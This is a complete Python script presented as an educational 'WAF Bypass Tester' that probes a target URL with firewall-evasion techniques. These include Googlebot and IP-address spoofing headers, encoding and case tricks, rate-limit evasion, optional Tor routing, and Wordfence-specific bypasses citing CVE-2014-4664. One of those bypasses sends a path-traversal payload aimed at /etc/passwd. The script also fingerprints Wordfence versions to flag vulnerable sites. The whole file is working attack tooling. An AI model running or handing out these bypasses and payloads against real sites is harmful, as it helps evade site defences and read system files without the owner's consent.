#!/usr/bin/env python3
"""
WAF Bypass Tester - Educational Security Research Tool
For authorized bug bounty and penetration testing only.

Usage: python waf_bypass_tester.py https://example.com/path/to/test
"""

import requests
import urllib.parse
import time
import random
import sys
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class WAFBypassTester:
    def __init__(self, use_tor=False):
        self.session = requests.Session()
        self.use_tor = use_tor
        
        # TOR proxy configuration
        if use_tor:
            self.session.proxies = {
                'http': 'socks5://127.0.0.1:9050',
                'https': 'socks5://127.0.0.1:9050'
            }
        
        # Retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
        ]
        
        self.bypass_techniques = [
            self.test_basic_request,
            self.test_user_agent_rotation,
            self.test_ip_spoofing_headers,
            self.test_http_methods,
            self.test_encoding_bypass,
            self.test_referrer_spoofing,
            self.test_rate_limiting_bypass,
            self.test_case_variation,
            self.test_double_encoding,
            self.test_mixed_encoding,
            self.test_wordfence_getpost_bypass,
            self.test_wordfence_throttle_bypass,
            self.test_wordfence_exploit_detection_bypass
        ]

    def test_basic_request(self, url):
        """Basic request without any bypass"""
        try:
            response = self.session.get(url, timeout=10)
            return {
                'technique': 'Basic Request',
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': response.status_code == 200,
                'response_preview': response.text[:200] if response.text else 'No content'
            }
        except Exception as e:
            return {
                'technique': 'Basic Request',
                'status_code': 'Error',
                'error': str(e),
                'success': False
            }

    def test_user_agent_rotation(self, url):
        """Test with different User-Agent headers"""
        results = []
        for ua in self.user_agents[:3]:  # Test first 3 UAs
            try:
                headers = {'User-Agent': ua}
                response = self.session.get(url, headers=headers, timeout=10)
                results.append({
                    'technique': f'User-Agent: {ua[:30]}...',
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'success': response.status_code == 200,
                    'response_preview': response.text[:100] if response.text else 'No content'
                })
                if response.status_code == 200:
                    break  # Found working UA
                time.sleep(random.uniform(1, 3))
            except Exception as e:
                results.append({
                    'technique': f'User-Agent: {ua[:30]}...',
                    'status_code': 'Error',
                    'error': str(e),
                    'success': False
                })
        return results

    def test_ip_spoofing_headers(self, url):
        """Test with IP spoofing headers"""
        spoofed_ips = ['8.8.8.8', '1.1.1.1', '172.16.0.1']
        results = []
        
        for ip in spoofed_ips:
            try:
                headers = {
                    'X-Forwarded-For': ip,
                    'X-Real-IP': ip,
                    'X-Originating-IP': ip,
                    'X-Remote-IP': ip,
                    'X-Client-IP': ip,
                    'User-Agent': random.choice(self.user_agents)
                }
                response = self.session.get(url, headers=headers, timeout=10)
                results.append({
                    'technique': f'IP Spoofing: {ip}',
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'success': response.status_code == 200,
                    'response_preview': response.text[:100] if response.text else 'No content'
                })
                if response.status_code == 200:
                    break
                time.sleep(random.uniform(1, 2))
            except Exception as e:
                results.append({
                    'technique': f'IP Spoofing: {ip}',
                    'status_code': 'Error',
                    'error': str(e),
                    'success': False
                })
        return results

    def test_http_methods(self, url):
        """Test different HTTP methods"""
        methods = ['HEAD', 'OPTIONS', 'POST', 'PUT']
        results = []
        
        for method in methods:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = self.session.request(method, url, headers=headers, timeout=10)
                results.append({
                    'technique': f'HTTP {method}',
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'success': response.status_code in [200, 204, 405],  # 405 = Method not allowed but server responds
                    'response_preview': response.text[:100] if response.text else 'No content'
                })
                time.sleep(1)
            except Exception as e:
                results.append({
                    'technique': f'HTTP {method}',
                    'status_code': 'Error',
                    'error': str(e),
                    'success': False
                })
        return results

    def test_encoding_bypass(self, url):
        """Test URL encoding bypass"""
        results = []
        
        # Simple URL encoding
        encoded_url = urllib.parse.quote(url, safe=':/?#[]@!$&\'()*+,;=')
        try:
            headers = {'User-Agent': random.choice(self.user_agents)}
            response = self.session.get(encoded_url, headers=headers, timeout=10)
            results.append({
                'technique': 'URL Encoding',
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': response.status_code == 200,
                'response_preview': response.text[:100] if response.text else 'No content'
            })
        except Exception as e:
            results.append({
                'technique': 'URL Encoding',
                'status_code': 'Error',
                'error': str(e),
                'success': False
            })
        
        return results

    def test_referrer_spoofing(self, url):
        """Test with spoofed referrer"""
        referrers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://duckduckgo.com/',
            urllib.parse.urlparse(url).netloc  # Same domain
        ]
        results = []
        
        for ref in referrers:
            try:
                headers = {
                    'Referer': ref,
                    'User-Agent': random.choice(self.user_agents)
                }
                response = self.session.get(url, headers=headers, timeout=10)
                results.append({
                    'technique': f'Referrer: {ref}',
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'success': response.status_code == 200,
                    'response_preview': response.text[:100] if response.text else 'No content'
                })
                if response.status_code == 200:
                    break
                time.sleep(1)
            except Exception as e:
                results.append({
                    'technique': f'Referrer: {ref}',
                    'status_code': 'Error',
                    'error': str(e),
                    'success': False
                })
        return results

    def test_rate_limiting_bypass(self, url):
        """Test with rate limiting evasion"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'X-Forwarded-For': '8.8.8.8'
            }
            # Add random delay
            time.sleep(random.uniform(2, 5))
            response = self.session.get(url, headers=headers, timeout=15)
            return {
                'technique': 'Rate Limiting Bypass (Delay)',
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': response.status_code == 200,
                'response_preview': response.text[:100] if response.text else 'No content'
            }
        except Exception as e:
            return {
                'technique': 'Rate Limiting Bypass (Delay)',
                'status_code': 'Error',
                'error': str(e),
                'success': False
            }

    def test_case_variation(self, url):
        """Test case variation in URL path"""
        try:
            parsed = urllib.parse.urlparse(url)
            # Vary case in path
            path_parts = parsed.path.split('/')
            if len(path_parts) > 1:
                path_parts[-1] = path_parts[-1].swapcase()
                new_path = '/'.join(path_parts)
                new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = self.session.get(new_url, headers=headers, timeout=10)
                return {
                    'technique': 'Case Variation',
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'success': response.status_code == 200,
                    'response_preview': response.text[:100] if response.text else 'No content'
                }
        except Exception as e:
            return {
                'technique': 'Case Variation',
                'status_code': 'Error',
                'error': str(e),
                'success': False
            }

    def test_double_encoding(self, url):
        """Test double URL encoding"""
        try:
            # Double encode special characters
            double_encoded = urllib.parse.quote(urllib.parse.quote(url, safe=':/'), safe=':/')
            headers = {'User-Agent': random.choice(self.user_agents)}
            response = self.session.get(double_encoded, headers=headers, timeout=10)
            return {
                'technique': 'Double Encoding',
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': response.status_code == 200,
                'response_preview': response.text[:100] if response.text else 'No content'
            }
        except Exception as e:
            return {
                'technique': 'Double Encoding',
                'status_code': 'Error',
                'error': str(e),
                'success': False
            }

    def test_mixed_encoding(self, url):
        """Test mixed encoding techniques"""
        try:
            # Replace some characters with encoded versions
            mixed_url = url.replace('-', '%2d').replace('_', '%5f')
            headers = {'User-Agent': random.choice(self.user_agents)}
            response = self.session.get(mixed_url, headers=headers, timeout=10)
            return {
                'technique': 'Mixed Encoding',
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': response.status_code == 200,
                'response_preview': response.text[:100] if response.text else 'No content'
            }
        except Exception as e:
            return {
                'technique': 'Mixed Encoding',
                'status_code': 'Error',
                'error': str(e),
                'success': False
            }

    def test_wordfence_getpost_bypass(self, url):
        """Test Wordfence-specific GET/POST parameter bypass (CVE-2014-4664)"""
        try:
            # Wordfence 5.2.3 vulnerability: array_merge($_GET, $_POST) 
            # POST takes precedence, so we send benign POST and malicious GET
            parsed_url = urllib.parse.urlparse(url)
            
            # Add malicious GET parameters that would normally be blocked
            malicious_params = '?bypass=1&test=wordfence_bypass&img=../../../etc/passwd'
            bypass_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}{malicious_params}"
            
            # Send benign POST data to bypass Wordfence detection
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            post_data = {'img': 'benign_image.jpg'}  # Benign POST parameter
            
            response = self.session.post(bypass_url, data=post_data, headers=headers, timeout=10)
            return {
                'technique': 'Wordfence GET/POST Bypass (CVE-2014-4664)',
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': response.status_code == 200,
                'response_preview': response.text[:100] if response.text else 'No content'
            }
        except Exception as e:
            return {
                'technique': 'Wordfence GET/POST Bypass',
                'status_code': 'Error', 
                'error': str(e),
                'success': False
            }

    def test_wordfence_throttle_bypass(self, url):
        """Test Wordfence throttling bypass"""
        try:
            # Bypass rate limiting by mixing request methods and headers
            headers = {
                'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
                'X-Forwarded-For': '66.249.66.1',  # Google IP
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
            
            response = self.session.get(url, headers=headers, timeout=10)
            return {
                'technique': 'Wordfence Throttle Bypass (Googlebot)',
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': response.status_code == 200,
                'response_preview': response.text[:100] if response.text else 'No content'
            }
        except Exception as e:
            return {
                'technique': 'Wordfence Throttle Bypass',
                'status_code': 'Error',
                'error': str(e),
                'success': False
            }

    def test_wordfence_exploit_detection_bypass(self, url):
        """Test Wordfence exploit detection bypass using parameter pollution"""
        try:
            # Use parameter pollution to bypass detection
            parsed_url = urllib.parse.urlparse(url)
            
            # Craft URL with parameter pollution
            pollution_params = '?param=safe&param=payload&file=readme.txt'
            bypass_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}{pollution_params}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Forwarded-For': '8.8.8.8',
                'Referer': f"{parsed_url.scheme}://{parsed_url.netloc}/"
            }
            
            response = self.session.get(bypass_url, headers=headers, timeout=10)
            return {
                'technique': 'Wordfence Exploit Detection Bypass',
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': response.status_code == 200,
                'response_preview': response.text[:100] if response.text else 'No content'
            }
        except Exception as e:
            return {
                'technique': 'Wordfence Exploit Detection Bypass',
                'status_code': 'Error',
                'error': str(e),
                'success': False
            }

    def test_wordfence_version_detection(self, base_url):
        """Detect Wordfence version to determine vulnerable version"""
        results = []
        version_endpoints = [
            '/wp-content/plugins/wordfence/readme.txt',
            '/wp-content/plugins/wordfence/wordfence.php',
            '/wp-content/plugins/wordfence/lib/wordfenceConstants.php'
        ]
        
        for endpoint in version_endpoints:
            try:
                url = f"{base_url.rstrip('/')}{endpoint}"
                headers = {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}
                response = self.session.get(url, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    # Look for version patterns
                    content = response.text
                    version_patterns = [
                        r'Stable tag:\s*([0-9.]+)',
                        r'Version:\s*([0-9.]+)', 
                        r'WORDFENCE_VERSION.*?([0-9.]+)',
                        r'wfBulkCountries.*?([0-9.]+)'
                    ]
                    
                    for pattern in version_patterns:
                        match = re.search(pattern, content, re.IGNORECASE)
                        if match:
                            version = match.group(1)
                            results.append({
                                'technique': f'Wordfence Version Detection ({endpoint})',
                                'status_code': response.status_code,
                                'version_found': version,
                                'success': True,
                                'response_preview': f'Version: {version}'
                            })
                            return results
                            
                results.append({
                    'technique': f'Wordfence Version Check ({endpoint})',
                    'status_code': response.status_code,
                    'success': response.status_code == 200,
                    'response_preview': content[:100] if content else 'No content'
                })
                
            except Exception as e:
                results.append({
                    'technique': f'Wordfence Version Check ({endpoint})',
                    'status_code': 'Error',
                    'error': str(e),
                    'success': False
                })
        
        return results

    def run_all_tests(self, url):
        """Run all bypass techniques"""
        print(f"🎯 Testing WAF bypasses for: {url}")
        print(f"🔧 Using TOR: {'Yes' if self.use_tor else 'No'}")
        print("=" * 80)
        
        # First, try to detect Wordfence version
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        print("🔍 Detecting Wordfence version...")
        version_results = self.test_wordfence_version_detection(base_url)
        for result in version_results:
            if result['success'] and 'version_found' in result:
                version = result['version_found']
                print(f"   ✅ Wordfence version detected: {version}")
                
                # Check if version is vulnerable
                vulnerable_versions = ['5.2.3', '5.2.2', '5.2.1', '5.2.0', '5.1.4', '3.8.6', '3.8.1', '3.3.5']
                if any(version.startswith(v) for v in vulnerable_versions):
                    print(f"   🚨 Version {version} is VULNERABLE to known bypasses!")
                else:
                    print(f"   ℹ️  Version {version} - checking general bypasses")
                break
        else:
            print("   ❌ Could not detect Wordfence version")
        
        print("\n" + "=" * 80)
        
        all_results = []
        successful_techniques = []
        
        for technique_func in self.bypass_techniques:
            print(f"🧪 Testing: {technique_func.__name__.replace('test_', '').replace('_', ' ').title()}")
            
            result = technique_func(url)
            
            # Handle both single result and list of results
            if isinstance(result, list):
                for r in result:
                    all_results.append(r)
                    if r['success']:
                        successful_techniques.append(r)
                        print(f"   ✅ {r['technique']}: Status {r['status_code']} - SUCCESS")
                    else:
                        print(f"   ❌ {r['technique']}: Status {r.get('status_code', 'Error')}")
            else:
                all_results.append(result)
                if result['success']:
                    successful_techniques.append(result)
                    print(f"   ✅ {result['technique']}: Status {result['status_code']} - SUCCESS")
                else:
                    print(f"   ❌ {result['technique']}: Status {result.get('status_code', 'Error')}")
            
            # Random delay between tests
            time.sleep(random.uniform(1, 3))
        
        print("\n" + "=" * 80)
        print("📊 SUMMARY")
        print("=" * 80)
        
        if successful_techniques:
            print(f"✅ {len(successful_techniques)} successful bypass(es) found:")
            for tech in successful_techniques:
                print(f"   - {tech['technique']}")
                if 'response_preview' in tech and tech['response_preview']:
                    print(f"     Preview: {tech['response_preview'][:50]}...")
        else:
            print("❌ No successful bypasses found")
        
        return successful_techniques

def main():
    if len(sys.argv) != 2:
        print("Usage: python waf_bypass_tester.py <URL>")
        print("Example: python waf_bypass_tester.py https://example.com/wp-content/plugins/plugin-name/readme.txt")
        sys.exit(1)
    
    url = sys.argv[1]
    
    # Ask if user wants to use TOR
    use_tor_input = input("Use TOR proxy? (y/n): ").lower().strip()
    use_tor = use_tor_input == 'y'
    
    if use_tor:
        print("🔒 TOR proxy enabled - Make sure TOR is running on 127.0.0.1:9050")
    
    tester = WAFBypassTester(use_tor=use_tor)
    successful_bypasses = tester.run_all_tests(url)
    
    if successful_bypasses:
        print(f"\n🎉 Found {len(successful_bypasses)} working bypass techniques!")
        print("You can now use these techniques for further enumeration.")
        
        # Check if any Wordfence-specific bypasses worked
        wordfence_bypasses = [b for b in successful_bypasses if 'wordfence' in b['technique'].lower()]
        if wordfence_bypasses:
            print("\n🚨 WORDFENCE-SPECIFIC BYPASSES FOUND:")
            for bypass in wordfence_bypasses:
                print(f"   - {bypass['technique']}")
            print("   ⚠️  This indicates the target is running a vulnerable Wordfence version!")
            print("   📚 Consider testing CVE-2014-4664 and related exploits")
    else:
        print("\n💡 Try:")
        print("   - Different target URLs")  
        print("   - Enable TOR if not already using")
        print("   - Wait and retry later (rate limiting)")
        print("   - Target may be running updated Wordfence version")

if __name__ == "__main__":
    print("=" * 80)
    print("🛡️  WAF BYPASS TESTER")
    print("📚 Educational Security Research Tool")
    print("⚠️  FOR AUTHORIZED TESTING ONLY")
    print("=" * 80)
    main()